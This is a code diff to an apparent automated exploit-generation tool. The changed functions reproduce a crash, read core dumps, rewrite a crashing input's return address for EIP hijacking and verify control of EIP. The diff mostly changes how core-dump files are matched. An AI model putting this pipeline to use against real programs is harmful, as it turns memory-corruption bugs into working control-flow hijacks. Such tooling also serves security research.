@@ -54,18 +54,19 @@ def reproducer(target: Target) -> bool:
         int_process = rep_proc.pid + 2
         #+2 because the process with rep_proc.pid is the wrapper process interpreted by the shell from process(). The actual target repro process is a child of the external one
         #100% a dumb way to do this, must change it
-        core_path = f'/core_dumps/core.{target.name}.{int_process}'
+        # core_path = f'/core_dumps/core.{target.name}.{int_process}'
+        match = glob.glob(f'/core_dumps/core.*.{int_process}')
 
-        if os.path.isfile(core_path):
+        if match and os.path.isfile(match[0]):
             return True
 
         else:
-            logging.error("Core dump is missing; Something went wrong.")
-            sys.exit(1)
+            logging.error("Core dump is missing")
+            cleanup(1)
 
     else:
         logging.error("No memory corruption crash detected")
-        sys.exit(1)
+        cleanup(1)
 
 
 def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
@@ -116,16 +117,14 @@ def root_cause_analysis(target: Target, crash_input: bytes) -> bool:
         # return none when the input does not lead to a crash
         return None
 
-    core_files = glob.glob(f'/core_dumps/core.{target.name}.*')
+    core_files = glob.glob(f'/core_dumps/core.*.*')
     int_process = crash_proc.pid + 2
 
-    core_path = f'/core_dumps/core.{target.name}.{int_process}'
+    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)
 
-    if core_path not in core_files:
-        logging.error(
-            "in root cause analysis, previous crash did not generate a core dump"
-        )
-        sys.exit(1)
+    if core_path is None:
+        logging.error("In root cause analysis, previous crash did not generate a core dump")
+        cleanup(1)
 
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder="little")
@@ -155,7 +154,6 @@ def payload_builder(target: Target) -> None:
 
     payload = overwrite_ra(
         target.target_input.content, 
-        target.name, 
         struct.pack("<I", target_address)
     )
 
@@ -164,7 +162,7 @@ def payload_builder(target: Target) -> None:
     return
 
 
-def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes) -> bytes:
+def overwrite_ra(crash_input: bytes, target_ra: bytes) -> bytes:
     """
     Rewrites a crashing input to replace the return address for EIP hijacking.
     The function extracts the EIP from a core dump, verifies it is present in the input,
@@ -176,7 +174,7 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes) -> bytes
     target_ra: The new return address to overwrite.
     """
 
-    core_files = glob.glob(f"/core_dumps/core.{target_bin}.*")
+    core_files = glob.glob(f"/core_dumps/core.*.*")
     core_files = sorted(core_files, key=lambda f: int(f.split(".")[-1]), reverse=True)
 
     core_path = core_files[0]
@@ -198,7 +196,7 @@ def target_ra(target_bin: str) -> int:
 
     # find in what adresses the stack fluctuates -> info proc mapping
 
-    core_files = glob.glob(f"/core_dumps/core.{target_bin}.*")
+    core_files = glob.glob(f"/core_dumps/core.*.*")
     core_files = sorted(core_files, key=lambda f: int(f.split(".")[-1]), reverse=True)
 
     core_path = core_files[0]
@@ -258,20 +256,19 @@ def verify_eip_control(target: Target):
         sys.exit(1)
 
     int_process = rep_proc.pid + 2
-    core_files = glob.glob(f'/core_dumps/core.{target.name}.*')
-    core_path = f'/core_dumps/core.{target.name}.{int_process}'
+    core_files = glob.glob(f'/core_dumps/core.*.*')
 
-    if core_path not in core_files:
-        pivot_logger.error(
-            "In EIP control verifier, the crashing program did not generate a core dump."
-        )
-        sys.exit(1)
+    core_path = next((f for f in core_files if f.endswith(f".{int_process}")), None)
+
+    if core_path is None:
+        logging.error("Verifying eip control, crash did not generate a core dump")
+        cleanup(1)
 
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder="little")
     if eip not in crash_input:
         pivot_logger.error("The crashing input failed to take control of EIP.")
-        sys.exit(1)
+        cleanup(1)
 
     if b'\x00' in crash_input:
         pivot_logger.error('MUTATION CONTAINS NULL BYTES')
